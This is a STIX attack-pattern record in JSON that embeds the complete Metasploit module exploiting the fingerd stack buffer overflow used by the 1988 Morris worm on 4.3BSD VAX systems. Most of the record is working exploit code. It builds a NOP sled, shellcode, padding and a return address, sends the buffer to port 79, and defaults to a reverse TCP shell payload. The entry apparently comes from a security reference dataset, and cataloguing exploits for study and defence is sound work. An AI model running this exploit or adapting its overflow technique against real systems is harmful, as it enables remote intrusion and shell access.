{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--e9d5673b-054d-48ac-9d1c-3353d0b89774",
    "created": "2024-08-14T16:56:54.580473Z",
    "modified": "2024-08-14T16:56:54.580477Z",
    "name": "Morris Worm fingerd Stack Buffer Overflow",
    "description": " This module exploits a stack buffer overflow in fingerd on 4.3BSD.  This vulnerability was exploited by the Morris worm in 1988-11-02. Cliff Stoll reports on the worm in the epilogue of The Cuckoo's Egg.  Currently, only bsd/vax/shell_reverse_tcp is supported. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/bsd/finger/morris_fingerd_bof.rb",
            "external_id": "morris_fingerd_bof.rb"
        },
        {
            "source_name": "reference",
            "url": "http://gunkies.org/wiki/Installing_4.3_BSD_on_SIMH#Setup"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n\n  Rank = NormalRanking\n\n  # This is so one-off that we define it here\n  ARCH_VAX = 'vax'\n\n  include Msf::Exploit::Remote::Tcp\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'              => 'Morris Worm fingerd Stack Buffer Overflow',\n      'Description'       => %q{\n        This module exploits a stack buffer overflow in fingerd on 4.3BSD.\n\n        This vulnerability was exploited by the Morris worm in 1988-11-02.\n        Cliff Stoll reports on the worm in the epilogue of The Cuckoo's Egg.\n\n        Currently, only bsd/vax/shell_reverse_tcp is supported.\n      },\n      'Author'            => [\n        'Robert Tappan Morris', # Discovery? Exploit and worm for sure\n        'Cliff Stoll',          # The Cuckoo's Egg epilogue and inspiration\n        'wvu'                   # Module, payload, and additional research\n      ],\n      'References'        => [\n        ['URL', 'https://en.wikipedia.org/wiki/Morris_worm'],         # History\n        ['URL', 'https://spaf.cerias.purdue.edu/tech-reps/823.pdf'],  # Analysis\n        ['URL', 'http://computerarcheology.com/Virus/MorrisWorm/'],   # Details\n        ['URL', 'https://github.com/arialdomartini/morris-worm'],     # Source\n        ['URL', 'http://gunkies.org/wiki/Installing_4.3_BSD_on_SIMH'] # Setup\n        # And credit to the innumerable VAX ISA docs on the Web\n      ],\n      'DisclosureDate'    => '1988-11-02',\n      'License'           => MSF_LICENSE,\n      'Platform'          => 'bsd',\n      'Arch'              => ARCH_VAX,\n      'Privileged'        => false, # Depends on inetd.conf, usually \"nobody\"\n      'Targets'           => [\n        # https://en.wikipedia.org/wiki/Source_Code_Control_System\n        ['@(#)fingerd.c   5.1 (Berkeley) 6/6/85',\n          'Ret'           => 0x7fffe9b0,\n          'Payload'       => {\n            'Space'       => 403,\n            'BadChars'    => \"\\n\",\n            'Encoder'     => 'generic/none', # There is no spoon\n            'DisableNops' => true            # Hardcoded NOPs\n          }\n        ]\n      ],\n      'DefaultTarget'     => 0,\n      'DefaultOptions'    => {'PAYLOAD' => 'bsd/vax/shell_reverse_tcp'}\n    ))\n\n    register_options([Opt::RPORT(79)])\n  end\n\n  def check\n    token = rand_text_alphanumeric(8..42)\n\n    connect\n    sock.put(\"#{token}\\n\")\n    res = sock.get_once\n\n    return CheckCode::Unknown unless res\n\n    if res.include?(\"Login name: #{token}\")\n      return CheckCode::Detected\n    end\n\n    CheckCode::Safe\n  rescue EOFError, Rex::ConnectionError => e\n    vprint_error(e.message)\n    CheckCode::Unknown\n  ensure\n    disconnect\n  end\n\n  def exploit\n    # Start by generating our custom VAX shellcode\n    shellcode = payload.encoded\n\n    # 0x01 is NOP in VAX-speak\n    nops = \"\\x01\" * (target.payload_space - shellcode.length)\n\n    # This pads past buffer corruption\n    padding = rand_text_alphanumeric(109)\n\n    # This zeroes out part of the stack frame\n    frame = \"\\x00\" * 16\n\n    # Finally, pack in our return address\n    ret = [target.ret].pack('V') # V is for VAX!\n\n    # The newline is for gets(3)\n    sploit = nops + shellcode + padding + frame + ret + \"\\n\"\n\n    # Fire away\n    print_status('Connecting to fingerd')\n    connect\n    print_status(\"Sending #{sploit.length}-byte buffer\")\n    sock.put(sploit)\n  # Hat tip @bcoles\n  rescue Rex::ConnectionError => e\n    fail_with(Failure::Unreachable, e.message)\n  ensure\n    disconnect\n  end\n\nend\n",
    "x_mitre_disclosure_date": "1988-11-02",
    "x_mitre_platforms": [
        "bsd'"
    ]
}